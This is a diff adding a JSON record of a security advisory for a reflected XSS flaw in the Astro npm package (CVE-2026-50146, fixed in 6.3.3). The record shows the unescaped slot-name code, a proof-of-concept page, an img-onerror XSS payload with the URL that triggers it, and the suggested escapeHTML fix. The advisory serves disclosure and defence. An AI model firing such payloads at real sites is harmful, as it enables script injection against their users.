@@ -1,0 +1,50 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-06-16T14:05:07Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "astro"
+  },
+  "Advisory": {
+    "DatabaseId": 363704,
+    "Id": "GSA_kwCzR0hTQS04aHY4LTUzNngtNHdxcM4ABYy4",
+    "GhsaId": "GHSA-8hv8-536x-4wqp",
+    "References": [
+      {
+        "Url": "https://github.com/withastro/astro/security/advisories/GHSA-8hv8-536x-4wqp"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-8hv8-536x-4wqp"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-8hv8-536x-4wqp"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-50146"
+      }
+    ],
+    "Description": "## Summary\n\nWhen a component uses a `client:*` directive, Astro inserts named slot content into a `data-astro-template` attribute without HTML escaping the slot name allowing an attacker to break out of the attribute context and inject arbitrary HTML, resulting in reflected XSS during SSR.\n\nThis is similar to GHSA-wrwg-2hg8-v723 but exploits a different injection point.\n\n## Vulnerable Code\n\n`packages/astro/src/runtime/server/render/component.ts:371:376`\n\n```ts\n// component.ts:371\n`\u003ctemplate data-astro-template${key !== 'default' ? `=\"${key}\"` : ''}\u003e${children[key]}\u003c/template\u003e`\n```\n\nI found that key is interpolated directly into the attribute value without proper escaping.\n\n## Proof of Concept\n\nFor the PoC, I set up with a minimal repository with Astro 6.3.1, Node.js: v26.0.0.\n\n**`astro.config.mjs`**\n```js\nimport react from '@astrojs/react';\nimport node from '@astrojs/node';\nimport { defineConfig } from 'astro/config';\nexport default defineConfig({\n  output: 'server',\n  adapter: node({ mode: 'standalone' }),\n  integrations: [react()],\n});\n```\n\n**`src/pages/index.astro`**\n```astro\n---\nimport Wrapper from '../components/Wrapper.jsx';\nconst slotName = Astro.url.searchParams.get('tab') ?? 'default';\n---\n\u003chtml\u003e\u003cbody\u003e\n  \u003cWrapper client:load\u003e\n    \u003cdiv slot={slotName}\u003econtent\u003c/div\u003e\n  \u003c/Wrapper\u003e\n\u003c/body\u003e\u003c/html\u003e\n```\n\n**`src/components/Wrapper.jsx`**\n```jsx\nexport default function Wrapper() { return null; }\n```\n\n**Payload:**\n```\nabc\"\u003e\u003c/template\u003e\u003c/astro-island\u003e\u003cimg src=x onerror=confirm(document.domain)\u003e\u003c!--\n```\nAccessing this URL will trigger the popup.\n\nhttp://localhost:4321/?tab=abc%22%3E%3C%2Ftemplate%3E%3C%2Fastro-island%3E%3Cimg+src%3Dx+onerror%3Dconfirm(document.domain)%3E%3C!--\n\n\n\n\u003cimg width=\"1268\" height=\"592\" alt=\"image\" src=\"https://github.com/user-attachments/assets/675cdc04-4134-4d83-883c-abe16d751ec7\" /\u003e\n\n\n\nThis will render in html.\n\n```html\n\u003ctemplate data-astro-template=\"abc\"\u003e\u003c/template\u003e\u003c/astro-island\u003e\n\u003cimg src=x onerror=confirm(document.domain)\u003e\u003c!--\"\u003econtent\u003c/template\u003e\n```\n\n## Fix\n\nI suggest leveraging the existing escape function on the slot name.\n\n```ts\n// component.ts:371\n`\u003ctemplate data-astro-template${key !== 'default' ? `=\"${escapeHTML(String(key))}\"` : ''}\u003e${children[key]}\u003c/template\u003e`\n```\n\n---",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-16T14:05:06Z",
+    "Severity": "HIGH",
+    "Summary": "Astro: Reflected XSS via unescaped slot name",
+    "UpdatedAt": "2026-06-16T14:05:25Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 7.1,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "6.3.3"
+      },
+      "VulnerableVersionRange": "\u003c 6.3.3"
+    }
+  ]
+}
